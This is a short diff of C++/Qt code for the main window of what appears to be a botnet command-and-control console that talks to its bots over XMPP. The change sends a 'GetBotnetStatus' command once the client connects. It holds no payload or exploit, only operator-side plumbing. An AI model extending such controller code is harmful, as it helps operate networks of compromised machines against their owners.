@@ -1,7 +1,9 @@
 #include "mainwindow.h"
 #include "global.h"
 #include "centralwidget.h"
+#include "connectdialog.h"
 #include "xmppclient.h"
+#include "command.h"
 #include <QAction>
 #include <QMenu>
 #include <QMenuBar>
@@ -9,13 +11,13 @@
 #include <QStatusBar>
 #include <QLabel>
 #include <QCloseEvent>
-#include "connectdialog.h"
 #include <QMessageBox>
 #include <QDebug>
 
 MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)
 {
-    _xmppClient = new XmppClient(this);
+    _xmppClient = new XmppClient(NICKNAME, APPLICATION_NAME);
+    _xmppClient -> setParent(this);
 
     createWidgets();
     createConnections();
@@ -73,6 +75,10 @@ void MainWindow::readyOnXmppClient()
     qDebug() << "Command && Control ready";
 
     setConnected(true);
+
+    Command command(GetBotnetStatus);
+
+    _xmppClient -> sendCommand(command);
 }
 
 void MainWindow::disconnectedOnXmppClient()
